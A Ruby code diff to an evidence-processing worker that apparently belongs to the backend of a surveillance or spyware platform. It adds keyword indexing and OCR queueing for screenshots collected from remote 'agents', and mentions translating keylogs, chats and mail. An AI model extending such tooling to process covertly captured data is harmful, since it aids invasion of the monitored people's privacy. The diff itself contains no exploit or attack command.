@@ -49,7 +49,6 @@ class InstanceWorker
   include RCS::Tracer
 
   SLEEP_TIME = 30
-  RESUME_TIME = 10
 
   def get_agent_target
     @agent = Item.agents.where({ident: @ident, instance: @instance, status: 'open'}).first
@@ -107,7 +106,7 @@ class InstanceWorker
                 decoded_data += data unless data.nil?
               end
             rescue EmptyEvidenceError => e
-              trace :info, "[#{raw_id}:#{@ident}:#{@instance}] deleting empty evidence #{raw_id}"
+              trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] deleting empty evidence #{raw_id}"
               RCS::DB::GridFS.delete(raw_id, "evidence")
               next
             rescue EvidenceDeserializeError => e
@@ -145,7 +144,11 @@ class InstanceWorker
                 ev.extend DefaultProcessing
               end
 
+              # post processing
               ev.process if ev.respond_to? :process
+
+              # full text indexing
+              ev.respond_to?(:keyword_index) ? ev.keyword_index : ev.default_keyword_index
 
               trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] processing evidence of type #{ev[:type]} (#{raw.bytesize} bytes)"
 
@@ -175,12 +178,17 @@ class InstanceWorker
 
                   # forward the evidence to connectors (if any)
                   RCS::DB::Connectors.new_evidence(evidence) unless evidence.nil?
+
+                  # add to the ocr processor queue
+                  OCRQueue.add(@target._id, evidence._id) if evidence and evidence.type == 'screenshot'
+
+                  # add to the translation quueue
+                  #TransQueue.add(@target._id, evidence._id) if evidence and ['keylog', 'chat', 'mail', 'file'].include? evidence.type
                 end
 
               rescue InvalidAgentTarget => e
                 trace :error, "Cannot find agent #{ident}:#{instance}, deleting all related evidence."
                 RCS::DB::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
-                return
               rescue Exception => e
                 trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
                 trace :error, "[#{raw_id}:#{@ident}:#{@instance}] #{e.backtrace}"
@@ -188,7 +196,7 @@ class InstanceWorker
             end
 
             processing_time = Time.now - start_time
-            trace :info, "[#{raw_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
+            trace :info, "[#{raw_id}] processed #{ev_type.upcase} for agent #{@agent['name']} (#{@agent.ident}) in #{processing_time} sec"
 
           rescue Mongo::ConnectionFailure => e
             trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot connect to database, retrying in 5 seconds ..."
@@ -224,11 +232,10 @@ class InstanceWorker
   def resume
     @state = :running
     @seconds_sleeping = 0
-    trace :debug, "[#{@agent['ident']}:#{@agent['instance']}] #{@evidences.size} evidences in queue for processing."
+    #trace :debug, "[#{@agent['ident']}:#{@agent['instance']}] #{@evidences.size} evidences in queue for processing."
   end
   
   def take_some_rest
-    #resume_pending if @seconds_sleeping % RESUME_TIME == 0
     sleep 1
     @seconds_sleeping += 1
   end
@@ -246,10 +253,6 @@ class InstanceWorker
     @state
   end
 
-  def forwarding?
-    RCS::DB::Config.instance.global['FORWARD'] == true
-  end
-  
   def sleeping_too_much?
     @seconds_sleeping >= SLEEP_TIME
   end
@@ -259,27 +262,11 @@ class InstanceWorker
 
     @semaphore.synchronize do
       if stopped?
+        resume
         trace :debug, "deferring work for #{@agent['ident']}:#{@agent['instance']}"
         EM.defer @process
       end
     end
-  end
-
-  def resume_pending
-    trace :info, "[#{@agent['ident']}:#{@agent['instance']}] resuming pending evidences."
-    db = Mongoid.database
-    evidences = db.collection('grid.evidence.files').find({filename: "#{@ident}:#{@instance}", metadata: {shard: RCS::DB::Config.instance.global['SHARD']}}, {sort: ["_id", :asc]})
-    trace :info, "[#{@agent['ident']}:#{@agent['instance']}] no resumable evidences to process." if @evidences.empty?
-    evidences.each do |ev|
-      ident, instance = ev['filename'].split(":")
-
-      # resume pending evidence
-      QueueManager.instance.queue instance, ident, ev['_id'].to_s
-    end
-
-    trace :info, "[#{@agent['ident']}:#{@agent['instance']}] done resuming."
-  rescue Exception => e
-    trace :error, "[#{e.class}] #{e.message}"
   end
 
   def to_s
